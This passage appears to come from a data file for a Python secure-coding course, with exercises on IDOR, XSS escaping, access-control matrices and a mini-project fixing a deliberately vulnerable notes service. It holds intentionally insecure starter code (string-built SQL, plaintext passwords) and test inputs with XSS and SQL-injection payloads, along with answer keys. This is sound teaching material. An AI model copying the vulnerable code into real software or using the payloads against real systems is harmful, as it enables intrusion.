print(view_invoice("asha", 1), view_invoice("asha", 2))`,
          line: 4,
          fix: r`INVOICES = {1: {"owner": "asha", "amount": 900}, 2: {"owner": "ravi", "amount": 450}}
def view_invoice(user, invoice_id):
    invoice = INVOICES.get(invoice_id)
    if invoice is None or invoice["owner"] != user:
        return "404"
    return f"{invoice['amount']}"
print(view_invoice("asha", 1), view_invoice("asha", 2))`,
          output: "900 404\n",
          hint: "Being logged in isn't the same as owning the invoice.",
          explain: "Authorisation must check that the record belongs to the current user, on every request.",
        },
        {
          id: "m1", kind: "mcq", difficulty: 3,
          prompt: "Which best prevents XSS in a Python web app?",
          options: [
            { text: "Removing the word 'script' from comments", why: "Easily bypassed (onerror=, <img>, encodings)." },
            { text: "Auto-escaping templates for all user content, plus a Content-Security-Policy", why: "Correct." },
            { text: "Using HTTPS", why: "Protects transport, not page content." },
          ],
          answer: 1,
          hint: "Escape on output.",
          explain: "Context-aware escaping at output time (which templates do by default) is the core defence; CSP is a second layer.",
        },
      ],
      exercises: [
        {
          id: "task", kind: "task", title: "Safe comment renderer", difficulty: 3,
          prompt: `Render comments as HTML list items. Input: \`author|text\` lines until \`end\`. Escape both author and text with html.escape, convert \`*word*\` to \`<em>word</em>\` **after** escaping (only for runs of letters/digits/spaces), cap text at 200 characters (before formatting), and print \`<li><b>author</b>: text</li>\`. Empty text → skip the comment and count it; print \`<!-- skipped N -->\` at the end if N > 0.`,
          starter: r`import html, re
`,
          tests: [
            { label: "Comments", input: "asha|Great *lesson*!\nhacker<img src=x onerror=alert(1)>|<script>steal()</script>\nravi|\nend\n", output: "<li><b>asha</b>: Great <em>lesson</em>!</li>\n<li><b>hacker&lt;img src=x onerror=alert(1)&gt;</b>: &lt;script&gt;steal()&lt;/script&gt;</li>\n<!-- skipped 1 -->" },
          ],
          hints: [
            "`author, _, text = line.partition(\"|\")`.",
            "`text[:200]`, then html.escape.",
            "`re.sub(r\"\\*([A-Za-z0-9 ]+)\\*\", r\"<em>\\1</em>\", escaped)`.",
            "Only the tags you add yourself are real HTML.",
          ],
          solution: r`import html, re

skipped = 0
while (line := input()) != "end":
    author, _, text = line.partition("|")
    if not text.strip():
        skipped += 1
        continue
    safe_text = html.escape(text[:200])
    safe_text = re.sub(r"\*([A-Za-z0-9 ]+)\*", r"<em>\1</em>", safe_text)
    print(f"<li><b>{html.escape(author)}</b>: {safe_text}</li>")
if skipped:
    print(f"<!-- skipped {skipped} -->")`,
          notes: "Escape first, then add your own formatting: anything the user typed stays text, and only tags your code inserts become HTML. Markdown libraries for user content must be configured to sanitise HTML too (e.g. with bleach/nh3).",
        },
        {
          id: "stretch", kind: "task", title: "Access-control matrix", difficulty: 4,
          prompt: `Implement \`can(user, action, doc)\` for a document app. Users have a role (\`admin\`, \`editor\`, \`viewer\`); documents have an owner and a \`shared_with\` list. Rules: admins can do anything; \`read\` is allowed for the owner, anyone in shared_with, and editors; \`edit\` for the owner and editors who are in shared_with; \`delete\` only for the owner (and admins). Unknown actions are denied. Read users (\`name role\`) until \`---\`, docs (\`id owner shared1,shared2\` — shared may be \`-\`) until \`---\`, then checks \`user action docid\` until \`end\`, printing \`allow\`/\`deny\`. Unknown users or docs → \`deny\`.`,
          starter: r`def can(user, action, doc):
    pass
`,
          tests: [
            { label: "Matrix", input: "asha viewer\nravi editor\nmeera admin\nzoe viewer\n---\nd1 asha ravi\nd2 zoe -\n---\nasha delete d1\nravi read d2\nravi edit d1\nravi edit d2\nzoe read d1\nmeera delete d2\nasha publish d1\nghost read d1\nend\n", output: "allow\nallow\nallow\ndeny\ndeny\nallow\ndeny\ndeny" },
          ],
          hints: [
            "Represent users as {name: role} and docs as {id: (owner, set_of_shared)}.",
            "Write can() as a clear sequence of early returns.",
            "Default to False — deny unless a rule allows.",
            "Look up user and doc first; missing → deny.",
          ],
          solution: r`def can(user, action, doc):
    name, role = user
    owner, shared = doc
    if role == "admin":
        return True
    if action == "read":
        return name == owner or name in shared or role == "editor"
    if action == "edit":
        return name == owner or (role == "editor" and name in shared)
    if action == "delete":
        return name == owner
    return False

users = {}
while (line := input()) != "---":
    name, role = line.split()
    users[name] = role
docs = {}
while (line := input()) != "---":
    doc_id, owner, shared = line.split()
    docs[doc_id] = (owner, set() if shared == "-" else set(shared.split(",")))
while (line := input()) != "end":
    name, action, doc_id = line.split()
    allowed = name in users and doc_id in docs and can((name, users[name]), action, docs[doc_id])
    print("allow" if allowed else "deny")`,
          notes: "Keeping every permission decision in one tested function (and denying by default) is how real apps avoid IDOR bugs. Frameworks offer the same idea as policies, guards or permission classes.",
        },
      ],
      realWorld: "OWASP Top 10 #1 is broken access control; bug-bounty platforms pay most often for IDOR and XSS; Django and Jinja2 auto-escape templates and Django ships CSRF protection on by default.",
      reteach: "XSS is someone writing 'the shop is closed, give your wallet to the man outside' on your shop's noticeboard — escaping laminates every notice so it can only be read, never act. Path traversal is a delivery driver told 'go to room 5, then up two floors and into the manager's office'. Authorisation is the receptionist checking it's actually your locker before opening it.",
      summary: [
        "Escape output for its context (html.escape / auto-escaping templates); add CSP.",
        "Normalise paths and confirm they stay under the base (is_relative_to); prefer generated filenames.",
        "Authenticate, then authorise every object access on the server (prevent IDOR); use CSRF tokens and rate limits.",
      ],
      version: "Path.is_relative_to: Python 3.9+",
    },
  ],
  exam: [
    {
      id: "e1", kind: "mcq", difficulty: 4,
      prompt: "Which pairing of risk and defence is WRONG?",
      options: [
        { text: "SQL injection → parameterised queries", why: "Correct pairing." },
        { text: "Password storage → SHA-256 without salt", why: "This is the wrong one: use a salted, slow KDF." },
        { text: "XSS → escaping output", why: "Correct pairing." },
      ],
      answer: 1,
      hint: "Fast, unsalted hashes are crackable.",
      explain: "Passwords need unique salts and a slow algorithm (PBKDF2, scrypt, bcrypt, argon2).",
    },
    {
      id: "e2", kind: "predict", difficulty: 3,
      code: r`import shlex
print(shlex.split("convert 'my photo.png' out.jpg"))
print(shlex.quote("a b; rm x"))`,
      answer: "['convert', 'my photo.png', 'out.jpg']\n'a b; rm x'\n",
      hint: "shlex follows shell quoting rules.",
      explain: "split respects quotes; quote wraps text so a shell treats it as one literal argument (still prefer argument lists over shells).",
    },
    {
      id: "e3", kind: "fill", difficulty: 3,
      prompt: "Use the module meant for security-sensitive randomness.",
      code: r`import ___
code = "".join(secrets.choice("0123456789") for _ in range(6))
print(len(code), code.isdigit())`,
      blanks: [["secrets"]],
      output: "6 True\n",
      hint: "Not random.",
      explain: "`secrets` uses the OS's cryptographically secure generator — right for OTPs and tokens.",
    },
  ],
  project: {
    id: "project", kind: "project", title: "Mini-project: security review of a notes service", difficulty: 4,
    prompt: `The starter is a tiny notes service with **five** security bugs. Fix them all without changing its output format:

1. SQL is built with f-strings (injection).
2. Passwords are stored in plain text — store \`pbkdf2_hmac("sha256", pw, salt, 50_000)\` with a per-user salt (use \`user.encode()\` as the salt here so tests are repeatable) and compare with hmac.compare_digest.
3. \`read\` returns any note by id — it must only return the user's own notes (otherwise \`not found\`).
4. Note text is printed into HTML unescaped.
5. Failed logins print the reason (\`no such user\` / \`wrong password\`) — print only \`login failed\`.

Commands (until \`end\`): \`register user pw\`, \`login user pw\` (sets the current user), \`add text…\`, \`read id\`.`,
    starter: r`import sqlite3, html, hashlib, hmac

db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE users (name TEXT PRIMARY KEY, pw TEXT)")
db.execute("CREATE TABLE notes (id INTEGER PRIMARY KEY, owner TEXT, body TEXT)")
current = None

while (line := input()) != "end":
    cmd, _, rest = line.partition(" ")
    if cmd == "register":
        user, pw = rest.split(" ", 1)
        db.execute(f"INSERT INTO users VALUES ('{user}', '{pw}')")
        print("registered", user)
    elif cmd == "login":
        user, pw = rest.split(" ", 1)
        row = db.execute(f"SELECT pw FROM users WHERE name = '{user}'").fetchone()
        if row is None:
            print("no such user")
        elif row[0] != pw:
            print("wrong password")
        else:
            current = user
            print("welcome", user)
    elif cmd == "add":
        cur = db.execute(f"INSERT INTO notes (owner, body) VALUES ('{current}', '{rest}')")
        print("note", cur.lastrowid)
    elif cmd == "read":
        row = db.execute(f"SELECT body FROM notes WHERE id = {rest}").fetchone()
        print(f"<div>{row[0]}</div>" if row else "not found")`,
    tests: [
      { label: "Normal use", input: "register asha s3cret-pass\nlogin asha s3cret-pass\nadd Buy milk & eggs <today>\nread 1\nend\n", output: "registered asha\nwelcome asha\nnote 1\n<div>Buy milk &amp; eggs &lt;today&gt;</div>" },
      { label: "Attacks", input: "register asha pw-asha-123\nregister ravi pw-ravi-456\nlogin asha pw-asha-123\nadd asha's private note\nlogin ravi wrong\nlogin nobody x\nlogin ravi pw-ravi-456\nread 1\nread 1 OR 1=1\nadd <script>alert(1)</script>\nread 2\nlogin x' OR '1'='1 anything\nend\n", output: "registered asha\nregistered ravi\nwelcome asha\nnote 1\nlogin failed\nlogin failed\nwelcome ravi\nnot found\nnot found\nnote 2\n<div>&lt;script&gt;alert(1)&lt;/script&gt;</div>\nlogin failed", hidden: true, category: "edge" },
    ],
    hints: [
      "Every execute gets `?` placeholders and a tuple of values.",
      "Store `kdf(user, pw).hex()`; at login recompute and compare_digest.",
      "read: `WHERE id = ? AND owner = ?`; if the id isn't all digits, answer not found.",
      "Wrap the body in html.escape before printing.",
    ],
    solution: r`import sqlite3, html, hashlib, hmac

db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE users (name TEXT PRIMARY KEY, pw TEXT)")
db.execute("CREATE TABLE notes (id INTEGER PRIMARY KEY, owner TEXT, body TEXT)")
current = None

def kdf(user, pw):
    return hashlib.pbkdf2_hmac("sha256", pw.encode(), user.encode(), 50_000).hex()

while (line := input()) != "end":
    cmd, _, rest = line.partition(" ")
    if cmd == "register":
        user, pw = rest.split(" ", 1)
        db.execute("INSERT INTO users VALUES (?, ?)", (user, kdf(user, pw)))
        print("registered", user)
    elif cmd == "login":
        user, _, pw = rest.rpartition(" ")
        row = db.execute("SELECT pw FROM users WHERE name = ?", (user,)).fetchone()
        if row and hmac.compare_digest(row[0], kdf(user, pw)):
            current = user
            print("welcome", user)
        else:
            print("login failed")
    elif cmd == "add":
        cur = db.execute("INSERT INTO notes (owner, body) VALUES (?, ?)", (current, rest))
        print("note", cur.lastrowid)
    elif cmd == "read":
        row = None
        if rest.isdigit():
            row = db.execute("SELECT body FROM notes WHERE id = ? AND owner = ?", (int(rest), current)).fetchone()
        print(f"<div>{html.escape(row[0])}</div>" if row else "not found")`,
    notes: "Fixing these five bugs makes the service much safer, but not production-ready: it still needs random salts, sessions with expiry instead of a global 'current user', rate limiting on login, CSRF protection and HTTPS once it's on the web, input size limits, and an independent security review.",
  },
};
